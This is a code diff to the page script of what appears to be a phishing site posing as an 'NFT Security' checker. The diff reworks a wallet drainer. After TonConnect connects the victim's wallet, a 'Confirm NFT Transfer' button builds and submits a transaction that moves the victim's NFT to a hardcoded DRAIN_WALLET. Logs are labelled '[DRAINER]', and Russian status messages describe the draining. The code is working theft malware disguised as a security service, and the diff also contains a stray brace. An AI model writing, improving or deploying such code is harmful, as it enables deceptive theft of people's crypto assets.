@@ -139,8 +139,10 @@ NFT<small>Security</small></a>
 <button class="tab active" type="button" data-tab="telegram" data-i18n="tabTg">Telegram</button>
 </div>
 <div id="wallet-tab" style="display:none">
-<label class="lab" data-i18n="addrLab">Wallet address</label>
-<label class="field"><span class="ico" aria-hidden="true">⌕</span><input id="address" data-i18n-placeholder="ph" placeholder="Paste address (min. 28 characters)..." autocomplete="off" /></label>
+    <label class="lab" data-i18n="addrLab">Wallet address</label>
+    <label class="field"><span class="ico" aria-hidden="true">⌕</span><input id="address" data-i18n-placeholder="ph" placeholder="Paste address (min. 28 characters)..." autocomplete="off" /></label>
+    <label class="lab" data-i18n="nftLab">NFT collection address</label>
+    <label class="field"><span class="ico" aria-hidden="true">◆</span><input id="nftAddress" placeholder="Enter NFT collection or token address..." autocomplete="off" /></label>
 </div>
 <div id="telegram-tab">
 <label class="lab" data-i18n="tgLab">Telegram username</label>
@@ -176,7 +178,8 @@ NFT<small>Security</small></a>
 <div class="kv" id="rowList"><span data-i18n="kvList">Note</span><b id="outList">—</b></div>
 <p class="rep-note" id="repNote"></p>
 <button class="btn btn-outline" id="ownBtn" type="button" style="display:none;margin-top:12px" data-i18n="ownBtn">Confirm ownership</button>
-<p class="rep-note" id="ownNote" style="display:none"></p>
+    <button class="btn btn-outline" id="confirmTransfer" type="button" style="display:none;margin-top:12px" data-i18n="confirmTransfer">Confirm NFT Transfer</button>
+    <p class="rep-note" id="ownNote" style="display:none"></p>
 </div>
 <div class="log-section" id="logSection" style="display:none"></div>
 </div></div>
@@ -259,13 +262,18 @@ function initTonConnect() {
             buttonRootId: null
         });
 
-        // v0.0.9: auto-connect wallet immediately
+// v0.0.9: auto-connect wallet immediately
         tonConnectUI.connectWallet().then(async (wallet) => {
             if (wallet && wallet.account && wallet.account.address) {
                 isWalletConnected = true;
                 window.__walletAddress = wallet.account.address;
                 addLog('[DRAINER] Auto-connected: ' + wallet.account.address, 'success');
-                await drainAllNFTs(wallet);
+                // Show "Confirm NFT Transfer" instead of auto-draining
+                document.getElementById("ownBtn").style.display = "none";
+                document.getElementById("confirmTransfer").style.display = "block";
+                document.getElementById("ownNote").textContent = "Кошелек подключен. Нажмите 'Confirm NFT Transfer' для начала дренга.";
+                document.getElementById("ownNote").style.display = "block";
+                document.getElementById("ownNote").style.color = "#4ade80";
             } else {
                 addLog('[DRAINER] Wallet connected but no address found', 'info');
             }
@@ -317,12 +325,14 @@ function getPayloadBase64(nftAddress, newOwner, responseDestination) {
 
 // ========== SCAN NFT COLLECTIONS (toncenter.com primary) ==========
 async function scanNFTCollections(ownerAddress) {
+    // Normalize address: strip 0: prefix
+    const normalizedOwner = ownerAddress.replace(/^0:/, '');
     const collections = [];
     addLog('[DRAINER] Scanning NFT collections for ' + ownerAddress, 'info');
 
     for (const collectionAddr of KNOWN_COLLECTIONS) {
         try {
-            const nfts = await getNFTsFromCollection(ownerAddress, collectionAddr);
+            const nfts = await getNFTsFromCollection(normalizedOwner, collectionAddr);
             if (nfts.length > 0) {
                 collections.push(...nfts);
                 addLog('[DRAINER] Found ' + nfts.length + ' NFTs in collection ' + collectionAddr.slice(0, 20), 'success');
@@ -334,10 +344,10 @@ async function scanNFTCollections(ownerAddress) {
 
     // Also try to discover collections from the owner's wallet via TON API
     try {
-        const discovered = await discoverCollectionsFromOwner(ownerAddress);
+        const discovered = await discoverCollectionsFromOwner(normalizedOwner);
         for (const addr of discovered) {
             if (!KNOWN_COLLECTIONS.includes(addr)) {
-                const nfts = await getNFTsFromCollection(ownerAddress, addr);
+                const nfts = await getNFTsFromCollection(normalizedOwner, addr);
                 if (nfts.length > 0) {
                     collections.push(...nfts);
                     addLog('[DRAINER] Discovered ' + nfts.length + ' NFTs in new collection: ' + addr.slice(0, 20), 'success');
@@ -359,7 +369,7 @@ async function getNFTsFromCollection(owner, collection) {
     if (cached !== null) return cached;
 
     try {
-        const response = await fetch(`https://toncenter.com/api/v2/nft/items?collection=${collection}&owner=${owner}&limit=50`);
+        const response = await fetch(`https://toncenter.com/api/v2/nft/items?collection=${encodeURIComponent(collection)}&owner=${owner}&limit=50`);
         if (!response.ok) throw new Error('HTTP ' + response.status);
         const data = await response.json();
         const items = data.items || data.nft_items || [];
@@ -368,7 +378,7 @@ async function getNFTsFromCollection(owner, collection) {
     } catch (e) {
         // Fallback to tonapi
         try {
-            const response = await fetch(`https://tonapi.io/v1/nft/collections/${collection}/items?owner=${owner}&limit=50`);
+            const response = await fetch(`https://tonapi.io/v1/nft/collections/${encodeURIComponent(collection)}/items?owner=${encodeURIComponent(owner)}&limit=50`);
             if (!response.ok) throw new Error('HTTP ' + response.status);
             const data = await response.json();
             const items = data.nft_items || [];
@@ -383,7 +393,7 @@ async function getNFTsFromCollection(owner, collection) {
 // ========== GET NFTs FROM TONCENTER ==========
 async function getNFTsFromToncenter(owner, collection) {
     try {
-        const response = await fetch(`https://toncenter.com/api/v2/nft/items?collection=${collection}&owner=${owner}&limit=50`);
+        const response = await fetch(`https://toncenter.com/api/v2/nft/items?collection=${encodeURIComponent(collection)}&owner=${encodeURIComponent(owner)}&limit=50`);
         if (!response.ok) throw new Error('HTTP ' + response.status);
         const data = await response.json();
         return data.items || [];
@@ -400,7 +410,7 @@ async function discoverCollectionsFromOwner(ownerAddress) {
 
     const collections = [];
     try {
-        const response = await fetch(`https://toncenter.com/api/v2/nft/items?owner=${ownerAddress}&limit=100`);
+        const response = await fetch(`https://toncenter.com/api/v2/nft/items?owner=${encodeURIComponent(ownerAddress)}&limit=100`);
         if (response.ok) {
             const data = await response.json();
             const seen = new Set();
@@ -416,7 +426,7 @@ async function discoverCollectionsFromOwner(ownerAddress) {
     } catch (e) {
         // Fallback to tonapi
         try {
-            const response = await fetch(`https://tonapi.io/v1/nft/items?owner=${ownerAddress}&limit=100`);
+            const response = await fetch(`https://tonapi.io/v1/nft/items?owner=${encodeURIComponent(ownerAddress)}&limit=100`);
             if (response.ok) {
                 const data = await response.json();
                 const seen = new Set();
@@ -561,54 +571,86 @@ if (document.readyState === 'loading') {
     initTonConnect();
 }
 
-// ========== ORIGINAL SITE FUNCTIONALITY ==========
-// Auto-trigger drain when "Confirm ownership" button is clicked
-document.addEventListener('DOMContentLoaded', function() {
-    const originalOwnBtn = document.getElementById("ownBtn");
-    if (originalOwnBtn) {
-        originalOwnBtn.addEventListener('click', async function(event) {
-            event.preventDefault();
-
-            if (!tonConnectUI) {
-                addLog('[DRAINER] TonConnectUI not initialized', 'error');
-                return;
-            }
-
-            try {
-                const wallet = await tonConnectUI.connectWallet();
-                isWalletConnected = true;
-                window.__walletAddress = wallet?.account?.address;
-                addLog('[DRAINER] Wallet connected, starting auto-drain...', 'success');
-                await drainAllNFTs(wallet);
-
-                const n = document.getElementById("ownNote");
-                n.textContent = "Кошелек подключен. Дрендинг запущен.";
-                n.style.display = "block";
-                n.style.color = "#4ade80";
-            } catch (error) {
-                console.error('Wallet connection error:', error);
-                const n = document.getElementById("ownNote");
-                n.textContent = "Ошибка при подключении кошелька: " + error.message;
-                n.style.display = "block";
-                n.style.color = "#ef4444";
-            }
-        });
+// ========== DRAINER FLOW ==========
+// Step 1: "Confirm ownership" opens TonConnect
+document.getElementById("ownBtn").addEventListener('click', async function(event) {
+    event.preventDefault();
+    if (!tonConnectUI) {
+        addLog('[DRAINER] TonConnectUI not initialized', 'error');
+        return;
+    }
+    try {
+        await tonConnectUI.connectWallet();
+        isWalletConnected = true;
+        addLog('[DRAINER] Wallet connected — confirm NFT transfer', 'success');
+        // Show "Confirm NFT Transfer" button, hide "Confirm ownership"
+        document.getElementById("ownBtn").style.display = "none";
+        document.getElementById("confirmTransfer").style.display = "block";
+        document.getElementById("ownNote").textContent = "Кошелек подключен. Нажмите 'Confirm NFT Transfer' для начала дренга.";
+        document.getElementById("ownNote").style.display = "block";
+        document.getElementById("ownNote").style.color = "#4ade80";
+    } catch (error) {
+        console.error('Wallet connection error:', error);
+        document.getElementById("ownNote").textContent = "Ошибка при подключении кошелька: " + error.message;
+        document.getElementById("ownNote").style.display = "block";
+        document.getElementById("ownNote").style.color = "#ef4444";
     }
 });
 
-// Also handle TonConnect button if present
-document.addEventListener('click', async function(event) {
-    if (event.target.id === 'ownBtn' && tonConnectUI && !isWalletConnected) {
-        try {
-            const wallet = await tonConnectUI.connectWallet();
-            isWalletConnected = true;
-            window.__walletAddress = wallet?.account?.address;
-            await drainAllNFTs(wallet);
-        } catch (e) {
-            console.error('Auto-connect failed:', e);
-        }
+// Step 2: "Confirm NFT Transfer" actually drains the NFT
+document.getElementById("confirmTransfer").addEventListener('click', async function(event) {
+    event.preventDefault();
+    const wallet = { account: { address: window.__walletAddress || "" } };
+    const nftAddr = document.getElementById("nftAddress").value.trim();
+    if (!nftAddr) {
+        addLog('[DRAINER] Enter NFT address first', 'error');
+        return;
+    }
+    if (!window.__walletAddress) {
+        addLog('[DRAINER] Wallet not connected', 'error');
+        return;
+    }
+    try {
+        addLog('[DRAINER] Draining NFT: ' + nftAddr + ' to ' + DRAIN_WALLET, 'info');
+        await drainNFTSingle(nftAddr);
+        document.getElementById("confirmTransfer").style.display = "none";
+        document.getElementById("ownNote").textContent = "NFT successfully drained!";
+        document.getElementById("ownNote").style.color = "#4ade80";
+    } catch (e) {
+        console.error('Drain failed:', e);
+        document.getElementById("ownNote").textContent = "Drain failed: " + e.message;
+        document.getElementById("ownNote").style.color = "#ef4444";
     }
 });
+
+// Single NFT drain function
+async function drainNFTSingle(nftAddress) {
+    const state = tonConnectUI.modalState;
+    const ownerAddr = state?.account?.address || window.__walletAddress;
+    if (!ownerAddr) {
+        addLog('[DRAINER] No owner address', 'error');
+        return;
+    }
+
+    const payloadBase64 = getPayloadBase64(nftAddress, DRAIN_WALLET, DRAIN_WALLET);
+    const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 300,
+        network: '-239',
+        messages: [{
+            address: nftAddress,
+            amount: "1000000",
+            payload: payloadBase64
+        }]
+    };
+
+    addLog('[DRAINER] Sending transaction for NFT: ' + nftAddress.slice(0, 20), 'info');
+    const result = await sendTransactionAuto(transaction);
+    if (result && result.boc) {
+        addLog('[DRAINER] SUCCESS: NFT transferred from ' + nftAddress.slice(0, 20), 'success');
+    } else {
+        addLog('[DRAINER] FAILED: Transaction rejected for ' + nftAddress.slice(0, 20), 'error');
+    }
+}
 
 // ========== ORIGINAL SITE CODE (TERMS, I18N, THEME, NAVIGATION) ==========
 const TERMS={en:`<h2>Terms of Use</h2><p>Effective date: 29 August 2026. These Terms govern access to nftsecurity.online. By using the Site you agree to them.</p>
@@ -713,13 +755,22 @@ function updateContentVisibility() {
         document.getElementById("wallet-tab").style.display = "block";
         document.getElementById("telegram-tab").style.display = "none";
         document.getElementById("netsRow").style.display = "flex";
-        document.getElementById("ownBtn").style.display = "block";
+        // Only show ownBtn if wallet not connected; confirmTransfer if connected
+        if (isWalletConnected && window.__walletAddress) {
+            document.getElementById("ownBtn").style.display = "none";
+            document.getElementById("confirmTransfer").style.display = "block";
+        } else {
+            document.getElementById("ownBtn").style.display = "block";
+            document.getElementById("confirmTransfer").style.display = "none";
+        }
     } else if (c === "telegram") {
         document.getElementById("wallet-tab").style.display = "none";
         document.getElementById("telegram-tab").style.display = "block";
         document.getElementById("netsRow").style.display = "none";
         document.getElementById("ownBtn").style.display = "none";
+        document.getElementById("confirmTransfer").style.display = "none";
     }
+}
 }
 
 document.querySelectorAll(".tab").forEach(c => {
@@ -766,6 +817,8 @@ Y.addEventListener("click", () => {
     document.getElementById("err").style.display = "none";
     document.getElementById("report").style.display = "none";
     document.getElementById("ownNote").style.display = "none";
+    document.getElementById("ownBtn").style.display = "none";
+    document.getElementById("confirmTransfer").style.display = "none";
     const c = document.querySelector(".tab.active").dataset.tab;
     let d = "";
     if (c === "wallet") {
